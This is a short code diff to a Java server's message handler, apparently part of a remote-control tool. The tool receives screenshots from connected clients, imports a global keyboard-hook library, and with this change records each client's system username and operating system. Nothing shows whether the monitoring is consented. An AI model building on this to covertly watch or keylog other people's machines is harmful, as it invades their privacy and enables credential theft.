@@ -1,16 +1,16 @@
 package utils;
 
-import network.ClientConnection;
-import network.Message;
-
-import javax.imageio.ImageIO;
-import javax.swing.JFrame;
 import java.awt.Graphics2D;
 import java.awt.event.WindowAdapter;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
 import java.io.InputStream;
+import javax.imageio.ImageIO;
+import javax.swing.JFrame;
 
+import app.Server;
+import network.ClientConnection;
+import network.Message;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import static utils.ServerUtils.print;
 
@@ -24,6 +24,16 @@ public class ServerMessageHandler {
         switch (message.getCommand()) {
             case "screen":
                 receiveScreenshot(message);
+                break;
+
+            case "username":
+                String name = (String) message.getArguments().get(0);
+                Server.addUserSystemName(c, name);
+                break;
+
+            case "os":
+                String os = (String) message.getArguments().get(0);
+                Server.addUserOS(c, os);
                 break;
             case "print":
                 print(message.getArguments().get(0));
